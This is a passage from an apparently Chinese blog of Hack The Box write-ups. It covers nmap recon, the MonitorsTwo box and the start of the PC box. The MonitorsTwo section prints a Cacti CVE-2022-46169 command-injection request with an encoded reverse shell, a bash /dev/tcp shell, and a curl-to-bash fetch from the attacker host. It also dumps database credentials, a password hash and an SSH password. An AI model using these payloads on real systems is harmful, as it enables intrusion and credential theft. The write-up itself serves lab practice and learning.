class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">|_ssl-date: 2023-06-07T21:55:16+00:00; +8h00m00s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: ------T21:55:17+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: -----T21:55:19+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: -------T21:54:38</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现域名sequel.htb与子域名dc.sequel.htb</p>
<h2 id="3-MonitorsTwo-版本漏洞"><a href="#3-MonitorsTwo-版本漏洞" class="headerlink" title="3.MonitorsTwo(版本漏洞)"></a>3.MonitorsTwo(版本漏洞)</h2><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/130957041?ops_request_misc=%7B%22request_id%22:%22168749798516800211583630%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168749798516800211583630&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-130957041-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=MonitorsTwo&spm=1018.2226.3001.4187">HTB MonitorsTwo_清风–的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43264813/article/details/130860974?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-0-130860974-blog-130957041.235%5Ev38%5Epc_relevant_sort_base3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">HackTheBox系列-MonitorsTwo_夜白君的博客-CSDN博客</a></p>
<h3 id="1-扫描端口"><a href="#1-扫描端口" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p><code>nmap -Pn 10.10.11.211 </code></p>
<blockquote>
<p>22和80</p>
</blockquote>
<p>访问</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621162319430.png"></p>
<p>这是一个Cacti的框架 Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
<p>抓个包</p>
<blockquote>
<p>POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 143<br>Origin: <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a><br>Connection: close<br>Referer: <a target="_blank" rel="noopener" href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a><br>Cookie: Cacti&#x3D;23c13c8cedf59e7ab5692967d58edba1; CactiDateTime&#x3D;Wed Jun 21 2023 16:26:22 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480<br>Upgrade-Insecure-Requests: 1</p>
<p>__csrf_magic&#x3D;sid%3A85cdbc25916003d0deb870cb3312ad1f4dbe3b51%2C1687335980&amp;action&#x3D;login&amp;login_username&#x3D;admin123&amp;login_password&#x3D;123&amp;remember_me&#x3D;on</p>
</blockquote>
<p>没看出来。</p>
<p>dirb扫描路径</p>
<blockquote>
<p>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/docs/">http://10.10.11.211/docs/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/images/">http://10.10.11.211/images/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/include/">http://10.10.11.211/include/</a>                                                                 </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a> (CODE:200|SIZE:13844)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/install/">http://10.10.11.211/install/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/lib/">http://10.10.11.211/lib/</a>                                                                     </li>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/LICENSE">http://10.10.11.211/LICENSE</a> (CODE:200|SIZE:15171)                                                         </li>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/log">http://10.10.11.211/log</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/plugins/">http://10.10.11.211/plugins/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/resource/">http://10.10.11.211/resource/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/scripts/">http://10.10.11.211/scripts/</a>                                                                 </li>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/server-status">http://10.10.11.211/server-status</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.10.11.211/service/">http://10.10.11.211/service/</a></li>
</ul>
<p>—- Entering directory: <a target="_blank" rel="noopener" href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a> —-</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://10.10.11.211/cache/index.php">http://10.10.11.211/cache/index.php</a> (CODE:302|SIZE:0)</li>
</ul>
</blockquote>
<p>没什么用</p>
<h3 id="2-版本漏洞"><a href="#2-版本漏洞" class="headerlink" title="2.版本漏洞"></a>2.版本漏洞</h3><p>回过头看看版本信息Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
<p>谷歌一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621201847673.png"></p>
<p>命令注入漏洞 (CVE-2022-46169)<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/">https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/</a></p>
<p>以下有两种做法，做法1，我的没实现成功；成功的是做法2。</p>
<h4 id="做法1："><a href="#做法1：" class="headerlink" title="做法1："></a>做法1：</h4><p>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;<code>bash+-c+&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code><br><code>bash -i &gt;&amp; /dev/tcp/10.10.14.96/1234 0&gt;&amp;1 //这个是攻击机的地址</code></p>
<blockquote>
<p>base64后：</p>
<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Dk4y1E7kf/">Hack The Box 赛季活动靶场【MonitorsTwo】User&amp;System Flag攻略_哔哩哔哩_bilibili</a></p>
<p>构造这个</p>
<blockquote>
<p><strong>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;`bash+-c+”{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}”&#96; HTTP&#x2F;1.1</strong><br><strong>X-Forwarded-For: 127.0.0.1</strong><br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: CactiDateTime&#x3D;Wed Jun 21 2023 22:26:48 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480; Cacti&#x3D;662c23c759cac6c538f02c2d2cb02919<br>Upgrade-Insecure-Requests: 1</p>
</blockquote>
<p>repeater发送之前，nc监听</p>
<p>nc -lvnp 1234，但是，没反应。</p>
<h4 id="做法2："><a href="#做法2：" class="headerlink" title="做法2："></a>做法2：</h4><p>换一条路。</p>
<p>下载以下地址的py文件。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sAsPeCt488/CVE-2022-46169/blob/main/CVE-2022-46169.py">CVE-2022-46169&#x2F;CVE-2022-46169.py at main · sAsPeCt488&#x2F;CVE-2022-46169 (github.com)</a></p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# vim 1234.sh</p>
<p>┌──(root㉿kali)-[~]<br>└─# cat 1234.sh<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.96&#x2F;1234 0&gt;&amp;1</p>
</blockquote>
<p>python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl 10.10.14.96&#x2F;1234.sh|bash</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a target="_blank" rel="noopener" href="http://10.10.14.96/">http://10.10.14.96</a>“<br>[*] Trying for 1 - 100 host ids<br>[+] Exploit Completed for host_id &#x3D; 1</p>
</blockquote>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python -m http.server 80 </p>
<p>10.10.11.211 - - [21&#x2F;Jun&#x2F;2023 23:49:57] “GET &#x2F; HTTP&#x2F;1.1” 200 -</p>
</blockquote>
<blockquote>
<p>新开窗口，nc -lvnp 1234</p>
</blockquote>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a target="_blank" rel="noopener" href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a target="_blank" rel="noopener" href="http://10.10.14.96/1234.sh">http://10.10.14.96/1234.sh</a> | <strong>&#x2F;bin&#x2F;bash</strong>“<br>[*] Trying for 1 - 100 host ids</p>
</blockquote>
<p>查看监听窗口</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# nc -lvnp 1234<br>listening on [any] 1234 …<br>connect to [10.10.14.96] from (UNKNOWN) [10.10.11.211] 54714<br>bash: cannot set terminal process group (1): Inappropriate ioctl for device<br>bash: no job control in this shell<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ </p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ ls -a<br>ls -a<br>.<br>..<br>.mdl_style.rb<br>.mdlrc<br>.rnd<br>CHANGELOG<br>LICENSE<br>README.md<br>about.php<br>aggregate_graphs.php<br>aggregate_items.php<br>aggregate_templates.php<br>auth_changepassword.php<br>auth_login.php<br>auth_profile.php<br>automation_devices.php<br>automation_graph_rules.php<br>automation_networks.php<br>automation_snmp.php<br>automation_templates.php<br>automation_tree_rules.php<br>boost_rrdupdate.php<br>cache<br>cacti.sql<br>cactid.php<br>cdef.php<br>cli<br>clog.php<br>clog_user.php<br>cmd.php<br>cmd_realtime.php<br>color.php<br>color_templates.php<br>color_templates_items.php<br>data_debug.php<br>data_input.php<br>data_queries.php<br>data_source_profiles.php<br>data_sources.php<br>data_templates.php<br>docs<br>formats<br>gprint_presets.php<br>graph.php<br>graph_image.php<br>graph_json.php<br>graph_realtime.php<br>graph_templates.php<br>graph_templates_inputs.php<br>graph_templates_items.php<br>graph_view.php<br>graph_xport.php<br>graphs.php<br>graphs_items.php<br>graphs_new.php<br>help.php<br>host.php<br>host_templates.php<br>images<br>include<br>index.php<br>install<br>lib<br>link.php<br>links.php<br>locales<br>log<br>logout.php<br>managers.php<br>mibs<br>permission_denied.php<br>plugins<br>plugins.php<br>poller.php<br>poller_automation.php<br>poller_boost.php<br>poller_commands.php<br>poller_dsstats.php<br>poller_maintenance.php<br>poller_realtime.php<br>poller_recovery.php<br>poller_reports.php<br>poller_spikekill.php<br>pollers.php<br>remote_agent.php<br>reports_admin.php<br>reports_user.php<br>resource<br>rra<br>rrdcleaner.php<br>script_server.php<br>scripts<br>service<br>service_check.php<br>settings.php<br>sites.php<br>snmpagent_mibcache.php<br>snmpagent_mibcachechild.php<br>snmpagent_persist.php<br>spikekill.php<br>templates_export.php<br>templates_import.php<br>tree.php<br>user_admin.php<br>user_domains.php<br>user_group_admin.php<br>utilities.php<br>vdef.php</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ cd include<br>cd include<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ ls<br>ls<br>auth.php<br>bottom_footer.php<br>cacti_version<br>cli_check.php<br>config.php<br>content<br>csrf.php<br>fa<br>fonts<br>global.php<br>global_arrays.php<br>global_constants.php<br>global_form.php<br>global_languages.php<br>global_session.php<br>global_settings.php<br>index.php<br>js<br>layout.js<br>plugins.php<br>realtime.js<br>session.php<br>themes<br>top_general_header.php<br>top_graph_header.php<br>top_header.php<br>vendor</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ cat config.php<br>cat config.php<br>&lt;?php<br>&#x2F;*<br> +————————————————————————-+<br> | Copyright (C) 2004-2020 The Cacti Group                                 |<br> |                                                                         |<br> | This program is free software; you can redistribute it and&#x2F;or           |<br> | modify it under the terms of the GNU General Public License             |<br> | as published by the Free Software Foundation; either version 2          |<br> | of the License, or (at your option) any later version.                  |<br> |                                                                         |<br> | This program is distributed in the hope that it will be useful,         |<br> | but WITHOUT ANY WARRANTY; without even the implied warranty of          |<br> | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |<br> | GNU General Public License for more details.                            |<br> +————————————————————————-+<br> | Cacti: The Complete RRDtool-based Graphing Solution                     |<br> +————————————————————————-+<br> | This code is designed, written, and maintained by the Cacti Group. See  |<br> | about.php and&#x2F;or the AUTHORS file for specific developer information.   |<br> +————————————————————————-+<br> | <a target="_blank" rel="noopener" href="http://www.cacti.net/">http://www.cacti.net/</a>                                                   |<br> +————————————————————————-+<br>*&#x2F;</p>
<p>&#x2F;*</p>
<ul>
<li>Make sure these values reflect your actual database&#x2F;host&#x2F;user&#x2F;password<br> *&#x2F;</li>
</ul>
<p>$database_type     &#x3D; ‘mysql’;<br>$database_default  &#x3D; ‘cacti’;<br>$database_hostname &#x3D; ‘db’;<br>$database_username &#x3D; ‘root’;<br>$database_password &#x3D; ‘root’;<br>$database_port     &#x3D; ‘3306’;<br>$database_retries  &#x3D; 5;<br>$database_ssl      &#x3D; false;<br>$database_ssl_key  &#x3D; ‘’;<br>$database_ssl_cert &#x3D; ‘’;<br>$database_ssl_ca   &#x3D; ‘’;<br>$database_persist  &#x3D; false;</p>
</blockquote>
<blockquote>
<p>define(‘DEBUG_SQL_FLOW’, true);www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root -e “show databases;”</strong></p>
<p>&lt;db –user&#x3D;root –password&#x3D;root -e “show databases;”<br>Database<br>information_schema<br>cacti<br>mysql<br>performance_schema<br>sys</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “show tables;”</strong><br>&lt;–user&#x3D;root –password&#x3D;root cacti -e “show tables;”<br>Tables_in_cacti<br>aggregate_graph_templates<br>aggregate_graph_templates_graph<br>aggregate_graph_templates_item<br>aggregate_graphs<br>aggregate_graphs_graph_item<br>aggregate_graphs_items<br>automation_devices<br>automation_graph_rule_items<br>automation_graph_rules<br>automation_ips<br>automation_match_rule_items<br>automation_networks<br>automation_processes<br>automation_snmp<br>automation_snmp_items<br>automation_templates<br>automation_tree_rule_items<br>automation_tree_rules<br>cdef<br>cdef_items<br>color_template_items<br>color_templates<br>colors<br>data_debug<br>data_input<br>data_input_data<br>data_input_fields<br>data_local<br>data_source_profiles<br>data_source_profiles_cf<br>data_source_profiles_rra<br>data_source_purge_action<br>data_source_purge_temp<br>data_source_stats_daily<br>data_source_stats_hourly<br>data_source_stats_hourly_cache<br>data_source_stats_hourly_last<br>data_source_stats_monthly<br>data_source_stats_weekly<br>data_source_stats_yearly<br>data_template<br>data_template_data<br>data_template_rrd<br>external_links<br>graph_local<br>graph_template_input<br>graph_template_input_defs<br>graph_templates<br>graph_templates_gprint<br>graph_templates_graph<br>graph_templates_item<br>graph_tree<br>graph_tree_items<br>host<br>host_graph<br>host_snmp_cache<br>host_snmp_query<br>host_template<br>host_template_graph<br>host_template_snmp_query<br>plugin_config<br>plugin_db_changes<br>plugin_hooks<br>plugin_realms<br>poller<br>poller_command<br>poller_data_template_field_mappings<br>poller_item<br>poller_output<br>poller_output_boost<br>poller_output_boost_local_data_ids<br>poller_output_boost_processes<br>poller_output_realtime<br>poller_reindex<br>poller_resource_cache<br>poller_time<br>processes<br>reports<br>reports_items<br>sessions<br>settings<br>settings_tree<br>settings_user<br>settings_user_group<br>sites<br>snmp_query<br>snmp_query_graph<br>snmp_query_graph_rrd<br>snmp_query_graph_rrd_sv<br>snmp_query_graph_sv<br>snmpagent_cache<br>snmpagent_cache_notifications<br>snmpagent_cache_textual_conventions<br>snmpagent_managers<br>snmpagent_managers_notifications<br>snmpagent_mibs<br>snmpagent_notifications_log<br><strong>user_auth</strong><br>user_auth_cache<br>user_auth_group<br>user_auth_group_members<br>user_auth_group_perms<br>user_auth_group_realm<br>user_auth_perms<br>user_auth_realm<br>user_domains<br>user_domains_ldap<br>user_log<br>vdef<br>vdef_items<br>version</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “select * from user_auth;”</strong></p>
</blockquote>
<blockquote>
<p>出现用户名啊，密码之类的表</p>
</blockquote>
<p>密码都是哈希过的</p>
<p>用hashcat反解$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC的明文</p>
<p>解出来后得到密码</p>
<h3 id="3-ssh连接"><a href="#3-ssh连接" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p>然后ssh连接</p>
<p><code>ssh marcus@monitorstwo.htb </code></p>
<p>如果提示找不到</p>
<p><code>vim /etc/hosts</code> 添加</p>
<p> 10.10.11.211 monitorstwo.htb即可</p>
<p><strong>funkymonkey.</strong></p>
<h3 id="4-cat-user-txt"><a href="#4-cat-user-txt" class="headerlink" title="4.cat user.txt"></a>4.cat user.txt</h3><p>获取到flag。</p>
<h3 id="获取root-txt"><a href="#获取root-txt" class="headerlink" title="获取root.txt"></a>获取root.txt</h3><p>我没成功</p>
<h3 id="5-findmnt"><a href="#5-findmnt" class="headerlink" title="5.findmnt"></a>5.findmnt</h3><p><code>findmnt</code>&#x2F;&#x2F;显示当前挂载命令</p>
<blockquote>
<pre><code>                                            nsfs      rw
</code></pre>
<p>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;75<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69&#x2F;mounts&#x2F;shm<br>│                                     shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4Z<br>└─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e&#x2F;mounts&#x2F;shm<br>                                      shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k</p>
</blockquote>
<blockquote>
<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>total 108<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 .<br>drwx—–x 5 root root  4096 Jun 21 15:30 ..<br>drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev<br>-rwxr-xr-x 1 root root     0 Mar 21 10:49 .dockerenv<br>-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 home<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 lib<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 media<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 mnt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc<br>drwx—— 1 root root  4096 Mar 21 10:50 root<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 run<br>drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys<br>drwxrwxrwt 1 root root 20480 Jun 21 16:14 tmp<br>drwxr-xr-x 1 root root  4096 Nov 14  2022 usr<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 var</p>
</blockquote>
<h3 id="6-x2F-bin-x2F-bash-p"><a href="#6-x2F-bin-x2F-bash-p" class="headerlink" title="6.  .&#x2F;bin&#x2F;bash -p"></a>6.  .&#x2F;bin&#x2F;bash -p</h3><blockquote>
<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash<br>-rwxr-xr-x 1 root root 1234376 Mar 27  2022 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash</p>
</blockquote>
<blockquote>
<p>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash -p</p>
</blockquote>
<blockquote>
<p>marcus@monitorstwo:~$ cd &#x2F;root<br>bash: cd: &#x2F;root: Permission denied</p>
</blockquote>
<p>-p命令执行没效果。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>找到cms版本漏洞，使用已存在的漏洞进行攻击，通过监听拿到shell。</p>
<h2 id="4-PC"><a href="#4-PC" class="headerlink" title="4.PC"></a>4.PC</h2><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/130940490">HTB PC_清风–的博客-CSDN博客</a></p>
<p>[htb pc wp_春猿火的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request_id%22:%22168751647616800213092172%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168751647616800213092172&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=htb">https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request%5Fid%22%3A%22168751647616800213092172%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168751647616800213092172&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=htb</a> pc&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h3 id="1-扫描端口-1"><a href="#1-扫描端口-1" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p>默认扫描只扫到了22端口，试试全端口扫描</p>
<p><code>nmap -p0-65535 10.10.11.214</code></p>
<blockquote>
<p>22&#x2F;tcp    open  ssh<br>50051&#x2F;tcp open  unknown</p>
</blockquote>
<h3 id="2-未知端口50051"><a href="#2-未知端口50051" class="headerlink" title="2.未知端口50051"></a>2.未知端口50051</h3><p>搜索引擎搜一下，说是grpc的默认端口为50051</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230623140547228.png"></p>
<blockquote>
<p>Google远程过程调用（Google Remote Procedure Call，gRPC）是基于HTTP 2.0传输层协议承载的高性能开源RPC软件框架，为管理和配置网络设备提供了一种API接口设计的方法。gRPC提供了多种编程语言，如C、Java、golong、python等。<br>gRPC可以作为数据传输协议与Telemetry技术配合使用，可实时、高速、精确的监控网络设备的运行状态。此外，网络设备提供了一种基于gRPC方式来管理设备的方法，包括配置、查询和能力获取三种方法。这些方法是通过设备和采集器对接，实现采集设备数据的功能。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
<p>下载链接工具。 但是要go环境。</p>
<h4 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h4><p>那就找docker的</p>
<p><code>docker pull fullstorydev/grpcurl:latest</code></p>
<p>启动</p>
<p><code>docker run fullstorydev/grpcurl -plaintext 10.10.11.214:50051  </code>  </p>
<p>少了参数。</p>
<p>-help</p>
<p>然后出现以下帮助</p>
<blockquote>
<p>Usage:<br>        &#x2F;bin&#x2F;grpcurl [flags] [address] [list|describe] [symbol]</p>
<p>The ‘address’ is only optional when used with ‘list’ or ‘describe’ and a<br>protoset or proto flag is provided.</p>
